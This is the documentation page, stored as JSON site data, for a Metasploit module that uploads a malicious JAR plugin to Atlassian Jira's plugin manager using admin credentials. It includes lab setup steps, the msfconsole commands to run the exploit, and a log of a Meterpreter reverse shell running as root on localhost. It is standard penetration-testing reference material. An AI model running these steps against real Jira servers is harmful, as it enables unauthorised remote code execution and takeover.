{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/jira_plugin_upload","result":{"data":{"moduleMetadataJson":{"id":"72351afd-519f-5f34-bc4d-58135d4a87cc","name":"Atlassian Jira Authenticated Upload Code Execution","fullname":"exploit/multi/http/jira_plugin_upload","description":"This module can be used to execute a payload on Atlassian Jira via\n        the Universal Plugin Manager(UPM). The module requires valid login\n        credentials to an account that has access to the plugin manager.\n        The payload is uploaded as a JAR archive containing a servlet using\n        a POST request against the UPM component. The check command will\n        test the validity of user supplied credentials and test for access\n        to the plugin manager.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/jira_plugin_upload","documentationSlug":"/modules/documentation/exploit/multi/http/jira_plugin_upload","referencesSlug":"/modules/references/exploit/multi/http/jira_plugin_upload"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module uses a POST request against the Atlassian Jira Universal Plugin Manager (UPM) to upload a malicious Java servlet in the form of a JAR archive. Once uploaded the module executes the payload with a GET request and then cleans up after itself by deleting the plugin. Successful exploitation is dependent on valid credentials to an account that has access to the UPM (typically the admin account). The module includes a check function that will validate user supplied credentials and access to the UPM.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The version of Atlassian Jira used for testing was 7.8.0 but the module should work for all versions of Jira as the main dependency is the implementation of Atlassian's UPM framework.</p>\n<p>To set up a vulnerable installation:</p>\n<ol>\n<li>\n<p>Build the Atlassian SDK environment. Instructions can be found below:</p>\n<ul>\n<li>Windows:\n<a href=\"https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-windows-system/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-windows-system/</a></li>\n<li>Linux/Mac:\n<a href=\"https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-linux-or-mac-system/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-linux-or-mac-system/</a></li>\n</ul>\n</li>\n<li>\n<p>Create a shell Jira plugin and launch the SDK. Instructions can be found below:</p>\n<ul>\n<li><a href=\"https://developer.atlassian.com/server/framework/atlassian-sdk/create-a-helloworld-plugin-project/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://developer.atlassian.com/server/framework/atlassian-sdk/create-a-helloworld-plugin-project/</a></li>\n</ul>\n</li>\n<li>Validate installation by browsing to localhost:2990/jira/ and logging in with the default credentials admin:admin</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install Atlassian SDK/Jira environment.</li>\n<li>Browse to localhost:2990/jira/ to confirm successful deployment.</li>\n<li>Start msfconsole: <code class=\"language-text\">msfconsole -q</code></li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/jira_plugin_upload</code></li>\n<li>Do: <code class=\"language-text\">set rhost [IP]</code></li>\n<li>Check credentials and UPM access: <code class=\"language-text\">check</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Successful exploitation:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/jira_plugin_upload\nmsf exploit(multi/http/jira_plugin_upload) &gt; set rhost 127.0.0.1\nrhost =&gt; 127.0.0.1\nmsf exploit(multi/http/jira_plugin_upload) &gt; check\n\n[*] Server accepted the credentials, user has access to plugin manager!\n[*] 127.0.0.1:2990 The target appears to be vulnerable.\nmsf exploit(multi/http/jira_plugin_upload) &gt; exploit\n\n[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?\n[*] Started reverse TCP handler on 127.0.0.1:4444 \n[*] Retrieving Session ID and XSRF token...\n[*] Attempting to upload UlDRthpT\n[*] Successfully uploaded UlDRthpT\n[*] Executing UlDRthpT\n[*] Deleting UlDRthpT\n[*] Sending stage (53837 bytes) to 127.0.0.1\n[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:43208) at 2018-02-25 13:45:43 -0500\n\nmeterpreter &gt; getuid\nServer username: root\nmeterpreter &gt; exit\n[*] Shutting down Meterpreter...\n\n[*] 127.0.0.1 - Meterpreter session 1 closed.  Reason: User exit\n[*] 127.0.0.1 - Meterpreter session 1 closed.  Reason: Died\nmsf exploit(multi/http/jira_plugin_upload) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"72351afd-519f-5f34-bc4d-58135d4a87cc"}}}